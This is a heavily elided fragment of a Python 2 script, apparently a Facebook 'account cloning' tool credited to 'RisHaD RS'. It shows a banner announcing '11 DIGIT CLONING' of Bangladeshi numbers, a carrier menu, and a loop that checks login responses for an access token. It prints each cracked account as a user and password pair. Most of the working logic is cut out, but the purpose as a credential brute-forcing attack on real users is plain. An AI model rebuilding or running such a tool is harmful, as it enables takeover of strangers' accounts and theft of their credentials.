...
os.system('clear')
psb('\x1b[1;32mBANGLADESH RisHaD 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : RisHaD RS'
    print 'FACEBOOK : Rs.RisHaD.946'
    print 'GITHUB     : github.com/RsRisHaD33'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[RisHaD-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
